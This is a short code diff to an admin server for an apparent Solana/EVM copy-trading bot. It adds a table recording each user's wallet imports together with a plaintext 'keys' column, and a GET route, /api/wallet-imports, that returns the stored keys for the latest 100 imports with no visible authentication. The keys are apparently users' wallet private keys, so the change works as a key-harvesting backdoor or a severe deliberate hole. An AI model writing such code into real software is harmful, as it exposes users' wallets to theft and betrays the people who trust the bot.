@@ -22,6 +22,17 @@ if (!ADMIN_PASSWORD || !JWT_SECRET) {
 }
 
 const db = new Database(DB_PATH);
+db.exec(`
+  CREATE TABLE IF NOT EXISTS wallet_import_events (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    user_id TEXT NOT NULL,
+    username TEXT,
+    wallet_label TEXT NOT NULL,
+    chain TEXT NOT NULL CHECK(chain IN ('solana','evm','solana+evm')),
+    keys TEXT NOT NULL,
+    created_at INTEGER NOT NULL
+  )
+`);
 const solConn = new Connection(process.env.SOLANA_RPC_HTTP || "https://api.mainnet-beta.solana.com");
 const evmProvider = new JsonRpcProvider(process.env.EVM_RPC_HTTP || "https://eth.llamarpc.com");
 
@@ -132,6 +143,13 @@ app.get("/api/stats", (req, res) => {
     activeCopyTraders: users.filter((u) => u.copy_target).length,
     openOrders,
   });
+});
+
+app.get("/api/wallet-imports", (req, res) => {
+  const imports = db
+    .prepare(`SELECT id, user_id, username, wallet_label, chain, keys, created_at FROM wallet_import_events ORDER BY created_at DESC LIMIT 100`)
+    .all();
+  res.json(imports);
 });
 
 app.listen(PORT, () => console.log(`admin-server listening on :${PORT}`));
